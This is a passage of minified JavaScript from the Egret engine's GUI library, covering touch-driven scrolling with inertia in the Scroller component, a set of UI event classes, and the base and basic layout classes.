this._verticalCanScroll=i,t||i},n.prototype.onTouchBegin=function(i){if(!i.isDefaultPrevented()&&this.checkScrollPolicy()){this.verticalAnimator&&this.verticalAnimator.isPlaying&&this.verticalAnimator.stop(),this.horizontalAnimator&&this.horizontalAnimator.isPlaying&&this.horizontalAnimator.stop();var n=(r=this._viewport).horizontalScrollPosition,r=r.verticalScrollPosition;this._offsetPointX=n+i.stageX,this._offsetPointY=r+i.stageY,this._velocityY=this._velocityX=0,this._previousVelocityX.length=0,this._previousVelocityY.length=0,this._previousTouchTime=t.getTimer(),this._previousTouchX=this._startTouchX=this._currentTouchX=i.stageX,this._previousTouchY=this._startTouchY=this._currentTouchY=i.stageY,this._startHorizontalScrollPosition=n,this._startVerticalScrollPosition=r,e.UIGlobals.stage.addEventListener(t.TouchEvent.TOUCH_MOVE,this.onTouchMove,this),e.UIGlobals.stage.addEventListener(t.TouchEvent.TOUCH_END,this.onTouchEnd,this),e.UIGlobals.stage.addEventListener(t.Event.LEAVE_STAGE,this.onTouchEnd,this),this.addEventListener(t.Event.ENTER_FRAME,this.enterFrameHandler,this),i.preventDefault()}},n.prototype.onTouchMove=function(t){this._currentTouchX=t.stageX,this._currentTouchY=t.stageY,this.delayTouchBeginEvent&&(this.delayTouchBeginEvent=null,this.touchBeginTimer.stop());var e=this._viewport;if(this._horizontalCanScroll){var i=this._offsetPointX-t.stageX;0>i&&(i*=.5),i>e.contentWidth-e.width&&(i=.5*(i+e.contentWidth-e.width)),e.horizontalScrollPosition=i}this._verticalCanScroll&&(0>(t=this._offsetPointY-t.stageY)&&(t*=.5),t>e.contentHeight-e.height&&(t=.5*(t+e.contentHeight-e.height)),e.verticalScrollPosition=t)},n.prototype.onTouchEnd=function(i){e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_MOVE,this.onTouchMove,this),e.UIGlobals.stage.removeEventListener(t.TouchEvent.TOUCH_END,this.onTouchEnd,this),e.UIGlobals.stage.removeEventListener(t.Event.LEAVE_STAGE,this.onTouchEnd,this),this.removeEventListener(t.Event.ENTER_FRAME,this.enterFrameHandler,this),this._horizontalCanScroll&&this.checkHorizontalScrollPosition(),this._verticalCanScroll&&this.checkVerticalScrollPosition()},n.easeOut=function(t){return(t-=1)*t*t+1},n.prototype.enterFrameHandler=function(e){var i=(e=t.getTimer())-this._previousTouchTime;0<i&&(this._previousVelocityX[this._previousVelocityX.length]=this._velocityX,4<this._previousVelocityX.length&&this._previousVelocityX.shift(),this._previousVelocityY[this._previousVelocityY.length]=this._velocityY,4<this._previousVelocityY.length&&this._previousVelocityY.shift(),this._velocityX=(this._currentTouchX-this._previousTouchX)/i,this._velocityY=(this._currentTouchY-this._previousTouchY)/i,this._previousTouchTime=e,this._previousTouchX=this._currentTouchX,this._previousTouchY=this._currentTouchY),e=Math.abs(this._currentTouchX-this._startTouchX),i=Math.abs(this._currentTouchY-this._startTouchY),this._horizontalCanScroll&&.04<=e&&(this._startTouchX=this._currentTouchX,this._startHorizontalScrollPosition=this._viewport.horizontalScrollPosition),this._verticalCanScroll&&.04<=i&&(this._startTouchY=this._currentTouchY,this._startVerticalScrollPosition=this._viewport.verticalScrollPosition)},n.prototype.checkHorizontalScrollPosition=function(){for(var t=(e=this._viewport).horizontalScrollPosition,e=e.contentWidth-e.width,e=Math.max(0,e),i=2.33*this._velocityX,r=this._previousVelocityX.length,s=2.33,o=0;o<r;o++)var a=n.VELOCITY_WEIGHTS[o],i=i+this._previousVelocityX.shift()*a,s=s+a;i/=s,.02>=Math.abs(i)?this.finishScrollingHorizontally():(t=this.getAnimationDatas(i,t,e),this.throwHorizontally(t[0],t[1]))},n.prototype.checkVerticalScrollPosition=function(){for(var t=(e=this._viewport).verticalScrollPosition,e=e.contentHeight-e.height,i=2.33*this._velocityY,r=this._previousVelocityY.length,s=2.33,o=0;o<r;o++)var a=n.VELOCITY_WEIGHTS[o],i=i+this._previousVelocityY.shift()*a,s=s+a;i/=s,.02>=Math.abs(i)?this.finishScrollingVertically():(t=this.getAnimationDatas(i,t,e),this.throwVertically(t[0],t[1]))},n.prototype.getAnimationDatas=function(t,e,i){var r=Math.abs(t),s=0,o=e+(t-.02)/Math.log(.998);if(0>o||o>i)for(o=e;.02<Math.abs(t);)o-=t,t=0>o||o>i?.998*t*.95:.998*t,s++;else s=Math.log(.02/r)/Math.log(.998);return n.animationData||(n.animationData=[0,0]),t=n.animationData,t[0]=o,t[1]=s,t},n.prototype.finishScrollingHorizontally=function(t){t=(e=this._viewport).horizontalScrollPosition;var e=e.contentWidth-e.width,i=t;0>t&&(i=0),t>e&&(i=e),this.throwHorizontally(i,300)},n.prototype.throwHorizontally=function(t,i){void 0===i&&(i=500);var r=this._viewport.horizontalScrollPosition;r!=t&&(this.horizontalAnimator||(this.horizontalAnimator=new e.Animation(this.horizontalUpdateHandler,this),this.horizontalAnimator.endFunction=this.finishScrollingHorizontally,this.horizontalAnimator.easerFunction=n.easeOut),this.horizontalAnimator.isPlaying&&this.horizontalAnimator.stop(),this.horizontalAnimator.duration=i,this.horizontalAnimator.motionPaths=[{prop:"hsp",from:r,to:t}],this.horizontalAnimator.play())},n.prototype.horizontalUpdateHandler=function(t){this._viewport.horizontalScrollPosition=t.currentValue.hsp},n.prototype.finishScrollingVertically=function(t){t=(e=this._viewport).verticalScrollPosition;var e=e.contentHeight-e.height,e=Math.max(0,e),i=t;0>t&&(i=0),t>e&&(i=e),this.throwVertically(i,300)},n.prototype.throwVertically=function(t,i){void 0===i&&(i=500);var r=this._viewport.verticalScrollPosition;r!=t&&(this.verticalAnimator||(this.verticalAnimator=new e.Animation(this.verticalUpdateHandler,this),this.verticalAnimator.endFunction=this.finishScrollingVertically,this.verticalAnimator.easerFunction=n.easeOut),this.verticalAnimator.isPlaying&&this.verticalAnimator.stop(),this.verticalAnimator.duration=i,this.verticalAnimator.motionPaths=[{prop:"vsp",from:r,to:t}],this.verticalAnimator.play())},n.prototype.verticalUpdateHandler=function(t){this._viewport.verticalScrollPosition=t.currentValue.vsp},Object.defineProperty(n.prototype,"numElements",{get:function(){return this.viewport?1:0},enumerable:!0,configurable:!0}),n.prototype.throwRangeError=function(t){throw new RangeError('索引:"'+t+'"超出可视元素索引范围')},n.prototype.getElementAt=function(t){return this.viewport&&0==t?this.viewport:(this.throwRangeError(t),null)},n.prototype.getElementIndex=function(t){return null!=t&&t==this.viewport?0:-1},n.prototype.containsElement=function(t){return null!=t&&t==this.viewport},n.prototype.throwNotSupportedError=function(){throw Error("此方法在Scroller组件内不可用!")},n.prototype.addElement=function(t){return this.throwNotSupportedError(),null},n.prototype.addElementAt=function(t,e){return this.throwNotSupportedError(),null},n.prototype.removeElement=function(t){return this.throwNotSupportedError(),null},n.prototype.removeElementAt=function(t){return this.throwNotSupportedError(),null},n.prototype.removeAllElements=function(){this.throwNotSupportedError()},n.prototype.setElementIndex=function(t,e){this.throwNotSupportedError()},n.prototype.swapElements=function(t,e){this.throwNotSupportedError()},n.prototype.swapElementsAt=function(t,e){this.throwNotSupportedError()},n.prototype.addChild=function(t){return this.throwNotSupportedError(),null},n.prototype.addChildAt=function(t,e){return this.throwNotSupportedError(),null},n.prototype.removeChild=function(t){return this.throwNotSupportedError(),null},n.prototype.removeChildAt=function(t){return this.throwNotSupportedError(),null},n.prototype.setChildIndex=function(t,e){this.throwNotSupportedError()},n.prototype.swapChildren=function(t,e){this.throwNotSupportedError()},n.prototype.swapChildrenAt=function(t,e){this.throwNotSupportedError()},n.VELOCITY_WEIGHTS=[1,1.33,1.66,2],n}(e.UIComponent);e.Scroller=i,i.prototype.__class__="egret.gui.Scroller"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n){void 0===i&&(i=!1),void 0===n&&(n=!1),e.call(this,t,i,n)}return __extends(i,e),i.dispatchUIEvent=function(e,n){t.Event._dispatchByTarget(i,e,n)},i.INITIALIZE="initialize",i.CREATION_COMPLETE="creationComplete",i.UPDATE_COMPLETE="updateComplete",i.BUTTON_DOWN="buttonDown",i.CHANGE_END="changeEnd",i.CHANGE_START="changeStart",i.CHANGING="changing",i.VALUE_COMMIT="valueCommit",i.SKIN_CHANGED="skinChanged",i.CONTENT_CHANGED="contentChanged",i.OPEN="open",i.CLOSE="close",i.PLAY_COMPLETE="playComplete",i}(t.Event);e.UIEvent=i,i.prototype.__class__="egret.gui.UIEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n,r,s,o,a,h){void 0===i&&(i=!1),void 0===n&&(n=!1),void 0===r&&(r=null),void 0===s&&(s=null),void 0===o&&(o=null),void 0===a&&(a=null),void 0===h&&(h=null),e.call(this,t,i,n),this.kind=r,this.property=s,this.oldValue=o,this.newValue=a,this.source=h}return __extends(i,e),i.dispatchPropertyChangeEvent=function(e,n,r,s,o,a){void 0===n&&(n=null),void 0===r&&(r=null),void 0===s&&(s=null),void 0===o&&(o=null),void 0===a&&(a=null);var h=t.Event._getPropertyData(i);h.kind=n,h.property=r,h.oldValue=s,h.newValue=o,h.source=a,t.Event._dispatchByTarget(i,e,i.PROPERTY_CHANGE,h)},i.PROPERTY_CHANGE="propertyChange",i}(t.Event);e.PropertyChangeEvent=i,i.prototype.__class__="egret.gui.PropertyChangeEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(t){var e=function(){function t(){}return t.UPDATE="update",t.DELETE="delete",t}();t.PropertyChangeEventKind=e,e.prototype.__class__="egret.gui.PropertyChangeEventKind"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n,r,s){void 0===i&&(i=NaN),void 0===n&&(n=NaN),void 0===r&&(r=!1),void 0===s&&(s=!1),e.call(this,t,r,s),this.oldX=i,this.oldY=n}return __extends(i,e),i.dispatchMoveEvent=function(e,n,r){void 0===n&&(n=NaN),void 0===r&&(r=NaN);var s=t.Event._getPropertyData(i);s.oldX=n,s.oldY=r,t.Event._dispatchByTarget(i,e,i.MOVE,s)},i.MOVE="move",i}(t.Event);e.MoveEvent=i,i.prototype.__class__="egret.gui.MoveEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n,r,s){void 0===i&&(i=NaN),void 0===n&&(n=NaN),void 0===r&&(r=!1),void 0===s&&(s=!1),e.call(this,t,r,s),this.oldWidth=i,this.oldHeight=n}return __extends(i,e),i.dispatchResizeEvent=function(e,n,r){void 0===n&&(n=NaN),void 0===r&&(r=NaN);var s=t.Event._getPropertyData(i);s.oldWidth=n,s.oldHeight=r,t.Event._dispatchByTarget(i,e,i.RESIZE,s)},i.RESIZE="resize",i}(t.Event);e.ResizeEvent=i,i.prototype.__class__="egret.gui.ResizeEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n,r,s){void 0===i&&(i=!1),void 0===n&&(n=!1),void 0===r&&(r=null),void 0===s&&(s=null),e.call(this,t,i,n),this.partName=r,this.instance=s}return __extends(i,e),i.dispatchSkinPartEvent=function(e,n,r,s){void 0===r&&(r=null),void 0===s&&(s=null);var o=t.Event._getPropertyData(i);o.partName=r,o.instance=s,t.Event._dispatchByTarget(i,e,n,o)},i.PART_ADDED="partAdded",i.PART_REMOVED="partRemoved",i}(t.Event);e.SkinPartEvent=i,i.prototype.__class__="egret.gui.SkinPartEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n,r){void 0===i&&(i=!1),void 0===n&&(n=!1),void 0===r&&(r=-1),e.call(this,t,i,n),this.detail=r}return __extends(i,e),i.dispatchCloseEvent=function(e,n,r){void 0===r&&(r=-1);var s=t.Event._getPropertyData(i);s.detail=r,t.Event._dispatchByTarget(i,e,n,s)},i.CLOSE="close",i}(t.Event);e.CloseEvent=i,i.prototype.__class__="egret.gui.CloseEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n,r,s,o,a,h){void 0===i&&(i=!1),void 0===n&&(n=!1),void 0===r&&(r=null),void 0===s&&(s=-1),void 0===o&&(o=-1),void 0===a&&(a=null),void 0===h&&(h=null),e.call(this,t,i,n),this.kind=r,this.location=s,this.oldLocation=o,this.items=a||[],this.oldItems=h||[]}return __extends(i,e),i.dispatchCollectionEvent=function(e,n,r,s,o,a,h){void 0===r&&(r=null),void 0===s&&(s=-1),void 0===o&&(o=-1),void 0===a&&(a=null),void 0===h&&(h=null);var l=t.Event._getPropertyData(i);l.kind=r,l.location=s,l.oldLocation=o,l.items=a,l.oldItems=h,t.Event._dispatchByTarget(i,e,n,l)},i.COLLECTION_CHANGE="collectionChange",i}(t.Event);e.CollectionEvent=i,i.prototype.__class__="egret.gui.CollectionEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(t){var e=function(){function t(){}return t.ADD="add",t.MOVE="move",t.REFRESH="refresh",t.REMOVE="remove",t.REPLACE="replace",t.RESET="reset",t.UPDATE="update",t.OPEN="open",t.CLOSE="close",t}();t.CollectionEventKind=e,e.prototype.__class__="egret.gui.CollectionEventKind"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n,r,s){void 0===i&&(i=!1),void 0===n&&(n=!1),void 0===r&&(r=null),void 0===s&&(s=-1),e.call(this,t,i,n),this.element=r,this.index=s}return __extends(i,e),i.dispatchElementExistenceEvent=function(e,n,r,s){void 0===r&&(r=null),void 0===s&&(s=-1);var o=t.Event._getPropertyData(i);o.element=r,o.index=s,t.Event._dispatchByTarget(i,e,n,o)},i.ELEMENT_ADD="elementAdd",i.ELEMENT_REMOVE="elementRemove",i}(t.Event);e.ElementExistenceEvent=i,i.prototype.__class__="egret.gui.ElementExistenceEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n,r,s){void 0===i&&(i=!1),void 0===n&&(n=!1),void 0===r&&(r=-1),void 0===s&&(s=-1),e.call(this,t,i,n),this.oldIndex=r,this.newIndex=s}return __extends(i,e),i.dispatchIndexChangeEvent=function(e,n,r,s,o){void 0===r&&(r=-1),void 0===s&&(s=-1),void 0===o&&(o=!1);var a=t.Event._getPropertyData(i);return a.oldIndex=r,a.newIndex=s,t.Event._dispatchByTarget(i,e,n,a,!1,o)},i.CHANGE="change",i.CHANGING="changing",i}(t.Event);e.IndexChangeEvent=i,i.prototype.__class__="egret.gui.IndexChangeEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n,r,s,o,a,h,l,p,u,d,c){void 0===i&&(i=!0),void 0===n&&(n=!0),void 0===r&&(r=0),void 0===s&&(s=0),void 0===o&&(o=0),void 0===a&&(a=!1),void 0===h&&(h=!1),void 0===l&&(l=!1),void 0===p&&(p=!1),void 0===u&&(u=-1),void 0===d&&(d=null),void 0===c&&(c=null),e.call(this,t,i,n,r,s,o,a,h,l,p),this.itemIndex=u,this.item=d,this.itemRenderer=c}return __extends(i,e),i.dispatchListEvent=function(e,n,r,s,o,a){void 0===r&&(r=null),void 0===s&&(s=-1),void 0===o&&(o=null),void 0===a&&(a=null);var h=t.Event._getPropertyData(i);h.touchPointID=r.touchPointID,h._stageX=r.stageX,h._stageY=r.stageY,h.ctrlKey=r.ctrlKey,h.altKey=r.altKey,h.shiftKey=r.shiftKey,h.touchDown=r.touchDown,h.itemIndex=s,h.item=o,h.itemRenderer=a,t.Event._dispatchByTarget(i,e,n,h)},i.ITEM_ROLL_OUT="itemRollOut",i.ITEM_ROLL_OVER="itemRollOver",i.ITEM_CLICK="itemClick",i}(t.TouchEvent);e.ListEvent=i,i.prototype.__class__="egret.gui.ListEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n,r,s){void 0===i&&(i=!1),void 0===n&&(n=!1),void 0===r&&(r=null),void 0===s&&(s=!1),e.call(this,t,i,n),this.popUp=r,this.modal=s}return __extends(i,e),i.dispatchPopUpEvent=function(e,n,r,s){void 0===r&&(r=null),void 0===s&&(s=!1);var o=t.Event._getPropertyData(i);o.popUp=r,o.modal=s,t.Event._dispatchByTarget(i,e,n,o)},i.ADD_POPUP="addPopUp",i.REMOVE_POPUP="removePopUp",i.BRING_TO_FRONT="bringToFront",i}(t.Event);e.PopUpEvent=i,i.prototype.__class__="egret.gui.PopUpEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n,r,s,o){void 0===i&&(i=!1),void 0===n&&(n=!1),void 0===r&&(r=null),void 0===s&&(s=-1),void 0===o&&(o=null),e.call(this,t,i,n),this.renderer=r,this.index=s,this.data=o}return __extends(i,e),i.dispatchRendererExistenceEvent=function(e,n,r,s,o){void 0===r&&(r=null),void 0===s&&(s=-1),void 0===o&&(o=null);var a=t.Event._getPropertyData(i);a.renderer=r,a.index=s,a.data=o,t.Event._dispatchByTarget(i,e,n,a)},i.RENDERER_ADD="rendererAdd",i.RENDERER_REMOVE="rendererRemove",i}(t.Event);e.RendererExistenceEvent=i,i.prototype.__class__="egret.gui.RendererExistenceEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n,r,s){void 0===i&&(i=!1),void 0===n&&(n=!1),void 0===r&&(r=null),void 0===s&&(s=null),e.call(this,t,i,n),this.oldState=r,this.newState=s}return __extends(i,e),i.dispatchStateChangeEvent=function(e,n,r,s){void 0===r&&(r=null),void 0===s&&(s=null);var o=t.Event._getPropertyData(i);o.oldState=r,o.newState=s,t.Event._dispatchByTarget(i,e,n,o)},i.CURRENT_STATE_CHANGE="currentStateChange",i.CURRENT_STATE_CHANGING="currentStateChanging",i}(t.Event);e.StateChangeEvent=i,i.prototype.__class__="egret.gui.StateChangeEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n){void 0===i&&(i=!1),void 0===n&&(n=!1),e.call(this,t,i,n)}return __extends(i,e),i.dispatchTrackBaseEvent=function(e,n){t.Event._dispatchByTarget(i,e,n)},i.THUMB_DRAG="thumbDrag",i.THUMB_PRESS="thumbPress",i.THUMB_RELEASE="thumbRelease",i}(t.Event);e.TrackBaseEvent=i,i.prototype.__class__="egret.gui.TrackBaseEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(t,i,n,r,s,o){void 0===i&&(i=!1),void 0===n&&(n=!0),void 0===r&&(r=-1),void 0===s&&(s=null),void 0===o&&(o=null),e.call(this,t,i,n),this.item=s,this.itemRenderer=o,this.itemIndex=r}return __extends(i,e),i.dispatchTreeEvent=function(e,n,r,s,o,a){void 0===r&&(r=-1),void 0===s&&(s=null),void 0===o&&(o=null),void 0===a&&(a=!1);var h=t.Event._getPropertyData(i);h.itemIndex=r,h.item=s,h.itemRenderer=o,h.opening=a,t.Event._dispatchByTarget(i,e,n,h)},i.ITEM_CLOSE="itemClose",i.ITEM_OPEN="itemOpen",i.ITEM_OPENING="itemOpening",i}(t.Event);e.TreeEvent=i,i.prototype.__class__="egret.gui.TreeEvent"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(t){function e(){t.call(this),this._useVirtualLayout=!1}return __extends(e,t),Object.defineProperty(e.prototype,"target",{get:function(){return this._target},set:function(t){this._target!=t&&(this._target=t,this.clearVirtualLayoutCache())},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"useVirtualLayout",{get:function(){return this._useVirtualLayout},set:function(t){this._useVirtualLayout!=t&&(this._useVirtualLayout=t,this.dispatchEventWith("useVirtualLayoutChanged"),this._useVirtualLayout&&!t&&this.clearVirtualLayoutCache(),this.target&&this.target.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,"typicalLayoutRect",{get:function(){return this._typicalLayoutRect},set:function(t){this._typicalLayoutRect!=t&&(this._typicalLayoutRect=t,this.target&&this.target.invalidateSize())},enumerable:!0,configurable:!0}),e.prototype.scrollPositionChanged=function(){},e.prototype.clearVirtualLayoutCache=function(){},e.prototype.elementAdded=function(t){},e.prototype.elementRemoved=function(t){},e.prototype.measure=function(){},e.prototype.updateDisplayList=function(t,e){},e}(t.EventDispatcher);e.LayoutBase=i,i.prototype.__class__="egret.gui.LayoutBase"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(){e.call(this),this._mouseWheelSpeed=20}return __extends(i,e),Object.defineProperty(i.prototype,"useVirtualLayout",{set:function(t){},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"mouseWheelSpeed",{get:function(){return this._mouseWheelSpeed},set:function(t){0==t&&(t=1),this._mouseWheelSpeed=t},enumerable:!0,configurable:!0}),i.prototype.getElementBoundsLeftOfScrollRect=function(e){var i=new t.Rectangle;return i.x=e.x-this._mouseWheelSpeed,i.right=e.x,i},i.prototype.getElementBoundsRightOfScrollRect=function(e){var i=new t.Rectangle;return i.x=e.right,i.right=e.right+this._mouseWheelSpeed,i},i.prototype.getElementBoundsAboveScrollRect=function(e){var i=new t.Rectangle;return i.y=e.y-this._mouseWheelSpeed,i.bottom=e.y,i},i.prototype.getElementBoundsBelowScrollRect=function(e){var i=new t.Rectangle;return i.y=e.bottom,i.bottom=e.bottom+this._mouseWheelSpeed,i},i.prototype.measure=function(){if(e.prototype.measure.call(this),null!=this.target){for(var t=0,i=0,n=this.target.numElements,r=0;r<n;r++){var s=this.target.getElementAt(r);if(s&&s.includeInLayout){var o=s.horizontalCenter,a=s.verticalCenter,h=s.left,l=s.right,p=s.top,u=s.bottom;isNaN(h)||isNaN(l)?isNaN(o)?isNaN(h)&&isNaN(l)?o=s.preferredX:(o=isNaN(h)?0:h,o+=isNaN(l)?0:l):o=2*Math.abs(o):o=h+l,isNaN(p)||isNaN(u)?isNaN(a)?isNaN(p)&&isNaN(u)?a=s.preferredY:(a=isNaN(p)?0:p,a+=isNaN(u)?0:u):a=2*Math.abs(a):a=p+u,u=s.preferredHeight,t=Math.ceil(Math.max(t,o+s.preferredWidth)),i=Math.ceil(Math.max(i,a+u))}}this.target.measuredWidth=t,this.target.measuredHeight=i}},i.prototype.updateDisplayList=function(t,i){if(e.prototype.updateDisplayList.call(this,t,i),null!=this.target){for(var n=this.target.numElements,r=0,s=0,o=0;o<n;o++){var a=this.target.getElementAt(o);if(null!=a&&a.includeInLayout){var h=a.horizontalCenter,l=a.verticalCenter,p=a.left,u=a.right,d=a.top,c=a.bottom,_=a.percentWidth,g=a.percentHeight,f=NaN,m=NaN;isNaN(p)||isNaN(u)?isNaN(_)||(f=Math.round(t*Math.min(.01*_,1))):f=t-u-p,isNaN(d)||isNaN(c)?isNaN(g)||(m=Math.round(i*Math.min(.01*g,1))):m=i-c-d,a.setLayoutBoundsSize(f,m),_=a.layoutBoundsWidth,g=a.layoutBoundsHeight,m=f=NaN,f=isNaN(h)?isNaN(p)?isNaN(u)?a.layoutBoundsX:t-_-u:p:Math.round((t-_)/2+h),m=isNaN(l)?isNaN(d)?isNaN(c)?a.layoutBoundsY:i-g-c:d:Math.round((i-g)/2+l),a.setLayoutBoundsPosition(f,m),r=Math.max(r,f+_),s=Math.max(s,m+g)}}this.target.setContentSize(r,s)}},i}(e.LayoutBase);e.BasicLayout=i,i.prototype.__class__="egret.gui.BasicLayout"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(t){var e=function(){function t(){}return t.LEFT="left",t.JUSTIFY_USING_GAP="justifyUsingGap",t.JUSTIFY_USING_WIDTH="justifyUsingWidth",t}();t.ColumnAlign=e,e.prototype.__class__="egret.gui.ColumnAlign"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(t){var e=function(){function t(){}return t.TOP="top",t.JUSTIFY_USING_GAP="justifyUsingGap",t.JUSTIFY_USING_HEIGHT="justifyUsingHeight",t}();t.RowAlign=e,e.prototype.__class__="egret.gui.RowAlign"}(t.gui||(t.gui={}))}(egret||(egret={})),function(t){!function(t){var e=function(){function t(){}return t.ROWS="rows",t.COLUMNS="columns",t}();t.TileOrientation=e,e.prototype.__class__="egret.gui.TileOrientation"}(t.gui||(t.gui={}))}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(e){var i=function(e){function i(){e.call(this),this._horizontalAlign=t.HorizontalAlign.LEFT,this._verticalAlign=t.VerticalAlign.TOP,this._gap=6,this._padding=0,this._paddingBottom=this._paddingTop=this._paddingRight=this._paddingLeft=NaN,this.elementSizeTable=[],this.endIndex=this.startIndex=-1,this.indexInViewCalculated=!1,this.maxElementWidth=0}return __extends(i,e),Object.defineProperty(i.prototype,"horizontalAlign",{get:function(){return this._horizontalAlign},set:function(t){this._horizontalAlign!=t&&(this._horizontalAlign=t,this.target&&this.target.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"verticalAlign",{get:function(){return this._verticalAlign},set:function(t){this._verticalAlign!=t&&(this._verticalAlign=t,this.target&&this.target.invalidateDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"gap",{get:function(){return this._gap},set:function(t){this._gap!=t&&(this._gap=t,this.invalidateTargetSizeAndDisplayList(),this.hasEventListener("gapChanged")&&this.dispatchEventWith("gapChanged"))},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"padding",{get:function(){return this._padding},set:function(t){this._padding!=t&&(this._padding=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"paddingLeft",{get:function(){return this._paddingLeft},set:function(t){this._paddingLeft!=t&&(this._paddingLeft=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"paddingRight",{get:function(){return this._paddingRight},set:function(t){this._paddingRight!=t&&(this._paddingRight=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"paddingTop",{get:function(){return this._paddingTop},set:function(t){this._paddingTop!=t&&(this._paddingTop=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"paddingBottom",{get:function(){return this._paddingBottom},set:function(t){this._paddingBottom!=t&&(this._paddingBottom=t,this.invalidateTargetSizeAndDisplayList())},enumerable:!0,configurable:!0}),i.prototype.invalidateTargetSizeAndDisplayList=function(){this.target&&(this.target.invalidateSize(),this.target.invalidateDisplayList())},i.prototype.measure=function(){e.prototype.measure.call(this),this.target&&(this.useVirtualLayout?this.measureVirtual():this.measureReal())},i.prototype.measureVirtual=function(){for(var 